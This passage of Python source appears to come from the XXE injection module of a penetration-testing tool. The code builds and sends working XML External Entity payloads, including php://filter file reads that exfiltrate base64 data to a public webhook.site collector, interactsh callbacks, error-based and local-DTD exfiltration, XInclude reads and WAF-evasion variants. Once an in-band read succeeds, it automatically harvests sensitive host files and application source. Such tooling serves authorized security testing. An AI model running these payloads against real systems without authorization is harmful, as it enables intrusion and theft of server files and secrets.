    # space and mangle '/'/'=', corrupting the payload. In the path those bytes survive
    # and webhook.site logs the raw request URL, which we regex back out.
    exfilUrl = "%s/%s/%%file;" % (wh.hostUrl(exfilToken), marker)
    dtd = ('<!ENTITY %% file SYSTEM "php://filter/convert.base64-encode/resource=%s">\n'
           '<!ENTITY %% eval "<!ENTITY &#x25; exfil SYSTEM \'%s\'>">\n'
           '%%eval;\n%%exfil;') % (_toResource(fileName), exfilUrl)
    dtdToken = wh.newToken(dtd)
    if not dtdToken:
        return None

    singleTimeWarnMessage("using public out-of-band exfiltration service '%s' for blind XXE" % wh.endpoint)
    payload = _buildDoctype(xml, rootName, '<!ENTITY %% dtd SYSTEM "%s"> %%dtd;' % wh.hostUrl(dtdToken))
    _send(payload)

    content, detected = None, False
    pattern = re.compile(r"/%s/([A-Za-z0-9+/=]+)" % re.escape(marker))
    for _ in range(OOB_POLL_ATTEMPTS):
        time.sleep(OOB_POLL_DELAY)
        for record in wh.captured(exfilToken):
            match = pattern.search(getText(record.get("url") or ""))
            if match:
                try:
                    content = getText(decodeBase64(match.group(1)))
                except Exception:
                    content = match.group(1)
                break
        if content:
            break
        if not detected and wh.captured(dtdToken):
            detected = True   # the target fetched our DTD -> blind XXE confirmed even without exfil

    if not detected:
        detected = bool(wh.captured(dtdToken))
    return {"payload": payload, "filename": fileName, "content": content, "detected": detected}


def _tryOob(xml, rootName):
    """T7 blind confirmation via an out-of-band collector (interactsh): an external
    parameter entity points at a unique callback URL. If the target's parser fetches
    it (or even just resolves its DNS), the collector records the interaction and we
    poll it back - definitive proof of blind XXE with egress, and it names the
    channel (HTTP vs DNS-only). Returns (payload, protocol) or None."""

    from lib.request.interactsh import Interactsh, hasCrypto

    if not hasCrypto():
        logger.debug("out-of-band blind XXE tier skipped (optional 'pycryptodome' not installed)")
        return None

    client = Interactsh(server=conf.get("oobServer"))
    if not client.registered:
        logger.debug("out-of-band blind XXE tier skipped (could not register with an interaction server)")
        return None

    singleTimeWarnMessage("using out-of-band interaction server '%s' for blind XXE confirmation (override with '--oob-server')" % client.server)
    try:
        url = client.url()
        subset = '<!ENTITY %% oob SYSTEM "%s">\n%%oob;' % url
        payload = _buildDoctype(xml, rootName, subset)
        _send(payload)
        interactions = client.pollUntil(OOB_POLL_ATTEMPTS, OOB_POLL_DELAY)
        if interactions:
            protocols = sorted(set((_.get("protocol") or "?").upper() for _ in interactions))
            return payload, ", ".join(protocols)
    finally:
        client.close()
    return None


def xxeScan():
    global SENTINEL, _OOB_CONSENT, _PLACE_INDEX
    SENTINEL = randomStr(length=12, lowercase=True)
    _OOB_CONSENT = None
    _PLACE_INDEX = 0

    debugMsg = "'--xxe' is self-contained: it detects XML External Entity injection "
    debugMsg += "in the request body and, once confirmed, automatically harvests high-value "
    debugMsg += "host files (or reads '--file-read' when given). SQL enumeration switches "
    debugMsg += "(--banner, --dbs, --tables, --dump) are ignored"
    logger.debug(debugMsg)

    xml = _cleanBody()
    if not _looksXml(xml):
        logger.error("no XML body found to test (provide an XML request body via '--data' or '-r')")
        return

    rootName = _rootName(xml)
    if not rootName:
        logger.error("could not locate the document root element in the XML body")
        return

    logger.info("testing XXE injection on the XML request body (root element: '%s')" % rootName)

    baseline = _send(xml)
    found = False           # an actual impact/oracle (file read, error-based, XInclude, blind)
    expansionSeen = False   # reflected DTD/internal-entity processing (weaker; must not stop the search)

    # T2: in-band reflected DTD/internal-entity expansion. This proves the parser
    # processes entities but is NOT yet file-read impact, so it deliberately does NOT
    # set `found` on its own - we first try to UPGRADE it to real file-read impact and
    # then emit a SINGLE report block with the strongest confirmed vector and its real
    # payload (one report per finding, as with the other non-SQL engines). The internal
    # expansion is only reported on its own when no external-entity read is reachable.
    payload = page = None
    for _locIndex in _sweepLocations(xml):
        payload, page = _tryInternal(xml, rootName, baseline, index=_locIndex)
        if payload:
            _PLACE_INDEX = _locIndex   # latch the reflecting location for every downstream read tier
            if _locIndex:
                logger.debug("in-band reflection confirmed at leaf text-node location #%d" % _locIndex)
            break
    if payload:
        expansionSeen = True
        logger.info("the XML body processes DTD/internal entities (in-band reflection confirmed)")

        if conf.get("fileRead"):
            content, readPayload = _tryInbandFileRead(xml, rootName, conf.fileRead)
            if content:
                found = True
                logger.info("in-band XXE file-read impact confirmed for '%s'" % conf.fileRead)
                _report("In-band file read ('%s')" % conf.fileRead, readPayload)
                _dumpFileRead(conf.fileRead, content)
        else:
            # No targeted '--file-read': AUTO-HARVEST a curated set of high-value files (the data
            # stays in the response, no third party). `--xxe` is an auxiliary, self-contained switch
            # - users generally don't know which file to request, so once an in-band read primitive
            # is confirmed we harvest by default (the XXE analogue of the other non-SQL engines'
            # automatic dumping). A specific target still overrides via '--file-read <path>'.
            harvested = _harvestFiles(xml, rootName)
            if harvested:
                found = True
                firstPath, _, firstPayload = harvested[0]
                harvested += _harvestSource(xml, rootName, harvested)   # server-side app source (php://filter)
                logger.info("in-band XXE file-read impact confirmed; harvested %d file(s)" % len(harvested))
                _report("In-band file read (auto-harvest, e.g. '%s')" % firstPath, firstPayload)
                saved = []
                for path, content, _ in harvested:
                    logger.info("read remote file '%s' (%d bytes)" % (path, len(content)))
                    localPath = _saveFileRead(path, content)
                    if localPath:
                        saved.append(localPath)
                    else:
                        conf.dumper.singleString("XXE file read ('%s'):\n%s" % (path, content))
                if saved:
                    conf.dumper.rFile(saved)
            else:
                # harvest read nothing (content relocated, or only benign host-identity exposed):
                # fall back to the pattern-based impact proof so file-read impact is still confirmed
                systemId, readPayload = _tryExternalFile(xml, rootName, baseline)
                if not systemId:
                    readPayload = _tryPhpFilter(xml, rootName, baseline)
                    systemId = "php://filter" if readPayload else None
                if systemId:
                    found = True
                    logger.info("in-band XXE file-read impact confirmed (external entity, e.g. '%s')" % systemId)
                    _report("In-band file-read impact (external entity '%s')" % systemId, readPayload)

        if not found:
            # Only INTERNAL general-entity expansion is reachable - external retrieval / local file
            # access / XInclude / OOB were NOT proven. That is a parser-configuration weakness, NOT a
            # confirmed XXE (which requires external resolution). Report it as its own, weaker finding
            # so it is not conflated with a true external-entity XXE.
            _report("DTD/internal general entity expansion enabled (external entity access NOT confirmed)",
                    payload, vulnType="XML parser configuration")

    # T3: error-based (works where entities are not reflected but errors leak). A
    # redundant detection channel once in-band reflection was already seen, so it is
    # skipped then - the file-read *impact* tiers below still run to try to upgrade.
    errorChannel = False
    if not found and not expansionSeen:
        payload, page = _tryError(xml, rootName)
        if payload:
            found = errorChannel = True
            backend = _fingerprint(page) or "Generic XML"
            logger.info("the XML body is vulnerable to XXE injection (error-based, back-end parser: '%s')" % backend)
            _report("Error-based (parameter entity, back-end: '%s')" % backend, payload)

    # T3b: no-egress error-based via local-DTD repurposing (detection; skip once reflected)
    if not found and not expansionSeen:
        payload, page = _tryLocalDtd(xml, rootName)
        if payload:
            found = errorChannel = True
            backend = _fingerprint(page) or "Generic XML"
            logger.info("the XML body is vulnerable to XXE injection (error-based via local-DTD repurposing, no egress required)")
            _report("Error-based (local-DTD repurposing, back-end: '%s')" % backend, payload)

    # T3c: error-based FILE EXFILTRATION - only on an explicit '--file-read' request.
    # The local-DTD vehicle is always tried (no egress); the remote-DTD vehicle needs
    # both a confirmed error channel (pointless on a blind target) and OOB consent.
    if conf.get("fileRead"):
        content, fileName = _tryErrorExfil(xml, rootName, errorChannel)
        if content:
            found = True
            logger.info("error-based in-band XXE file read of '%s' succeeded" % fileName)
            _report("Error-based in-band file read ('%s')" % fileName, "<error-based exfiltration of '%s'>" % fileName)
            _dumpFileRead(fileName, content)

    # T4: XInclude fallback (no DOCTYPE/entity control needed). Reflection never latched a location
    # here, so sweep the leaf text nodes (a schema-rejected or non-parsed first leaf otherwise hides it).
    if not found:
        for _locIndex in _sweepLocations(xml):
            payload, systemId, snippet = _tryXInclude(xml, rootName, baseline, index=_locIndex)
            if payload:
                found = True
                logger.info("the XML body is vulnerable to XInclude file read ('%s'): '%s'" % (systemId, snippet))
                _report("XInclude file read ('%s')" % systemId, payload)
                break

    # T5: WAF-evasion fallbacks (UTF-16 re-encoding, PUBLIC-for-SYSTEM). The UTF-16
    # variant re-detects internal-entity reflection, so it is redundant (and mislabels
    # as 'evasion') once reflection was already seen - skip it then.
    if not found and not expansionSeen:
        title, payload = _tryEvasions(xml, rootName, baseline)
        if title:
            found = True
            logger.info("the XML body is vulnerable to XXE injection (%s)" % title.lower())
            _report(title, payload)

    # T6: time-based blind (no collector, no third party) - external entity to a non-routable host.
    # Skipped once in-band reflection worked: the target is demonstrably not blind, so the (slow)
    # blind tiers add nothing and would needlessly stall.
    if not found and not expansionSeen:
        logger.debug("attempting time-based blind XXE (external entity to a non-routable host); this can be slow")
        payload = _tryTimeBlind(xml, rootName)
        if payload:
            found = True
            logger.info("the XML body is vulnerable to XXE injection (time-based blind, external entity resolution reaches out-of-band)")
            _report("Time-based blind (external entity to non-routable host)", payload)

    # T7: out-of-band tiers - THIRD PARTY, so only on explicit consent (default NO). Also blind-only
    # (skipped when in-band reflection already worked, so a non-blind target never triggers the prompt).
    # Low-impact callback confirmation is the default; actual file exfiltration is
    # attempted only when the user explicitly asked for a file via '--file-read'.
    if not found and not expansionSeen and _oobConsent():
        if conf.get("fileRead"):
            exfil = _tryOobExfil(xml, rootName)
            if exfil and (exfil["content"] or exfil["detected"]):
                found = True
                if exfil["content"]:
                    logger.info("blind XXE out-of-band file read of '%s' succeeded" % exfil["filename"])
                    _report("Out-of-band blind file read ('%s')" % exfil["filename"], exfil["payload"])
                    _dumpFileRead(exfil["filename"], exfil["content"])
                else:
                    logger.info("blind XXE confirmed (out-of-band; target fetched the hosted DTD)")
                    _report("Out-of-band blind (hosted-DTD callback)", exfil["payload"])
        else:
            result = _tryOob(xml, rootName)
            if result:
                payload, protocol = result
                found = True
                logger.info("blind XXE confirmed (out-of-band %s callback to the interaction server)" % protocol)
                _report("Out-of-band blind (collector callback: %s)" % protocol, payload)

    if not found:
        if expansionSeen:
            # in-band entity processing is real, but no external-entity/blind oracle was reachable
            # (typically external entities disabled) - report honestly rather than overstate impact
            logger.info("DTD/internal entity processing is enabled, but no external-entity file-read or blind XXE oracle was established")
            logger.info("XXE scan complete")
            return
        # Reachable-but-not-exploitable diagnostics: distinguish a hardened parser
        # from a merely non-reflecting one so the user knows why it did not fire.
        probe = _send(_buildDoctype(xml, rootName, '<!ENTITY %% p SYSTEM "file:///%s">%%p;' % SENTINEL))
        if re.search(XXE_HARDENED_REGEX, getUnicode(probe)):
            logger.info("the XML parser is reachable but appears hardened against XXE (DTD/external entities refused)")
        else:
            backend = _fingerprint(probe)
            if backend:
                logger.info("the XML body reaches a parser (back-end: '%s') but no XXE oracle could be established" % backend)
            logger.warning("the XML body does not appear to be injectable via XXE")
        return

    logger.info("XXE scan complete")
